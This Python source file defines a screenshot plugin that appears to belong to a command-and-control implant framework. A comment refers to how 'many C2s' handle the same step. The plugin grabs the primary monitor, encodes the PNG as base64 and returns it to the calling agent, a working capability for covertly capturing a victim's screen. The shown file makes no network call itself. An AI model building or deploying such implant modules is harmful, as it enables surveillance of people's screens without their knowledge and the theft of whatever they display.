import base64
import io
from mss import mss
try:
    from .base import BasePlugin
except (ImportError, ValueError):
    from base import BasePlugin
from typing import Dict, Any

class ScreenshotPlugin(BasePlugin):
    @property
    def name(self): return "screenshot"

    def execute(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Captures a screenshot of the primary monitor."""
        try:
            with mss() as sct:
                # Get raw pixels from the first monitor
                monitor = sct.monitors[1]
                sct_img = sct.grab(monitor)
                
                # Convert to PNG using internal mss tools or just use the raw bytes
                # For better compatibility/quality control, we'll use zlib compressed data 
                # but many C2s just use a quick PNG save to memory.
                import mss.tools
                img_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size)
                
                encoded = base64.b64encode(img_bytes).decode('utf-8')
                
                return {
                    "status": "success",
                    "format": "png",
                    "content": encoded,
                    "size": len(img_bytes)
                }
        except Exception as e:
            return {"status": "error", "error": str(e)}
